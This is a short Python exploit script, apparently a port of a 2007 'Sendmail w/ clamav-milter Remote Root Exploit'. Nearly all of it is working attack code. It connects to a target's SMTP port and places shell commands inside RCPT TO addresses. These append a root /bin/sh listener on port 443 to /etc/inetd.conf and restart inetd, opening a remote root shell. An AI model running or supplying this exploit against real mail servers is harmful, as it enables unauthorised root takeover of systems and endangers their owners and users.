import sys
import socket

print("Sendmail w/ clamav-milter Remote Root Exploit")
print("Copyright (C) 2007 Eliteboy\n")

if len(sys.argv) != 2:
    print("Give me a host to connect.")
    sys.exit()

host = sys.argv[1]
port = 25

print(f"Attacking {host}...\n")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((host, port))
    
    sock.sendall(b"ehlo you\r\n")
    sock.sendall(b"mail from: <>\r\n")
    sock.sendall(b"rcpt to: <nobody+\"|echo '443 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n")
    sock.sendall(b"rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n")
    sock.sendall(b"data\r\n.\r\nquit\r\n")
    
    data = sock.recv(1024)
    print(data.decode())
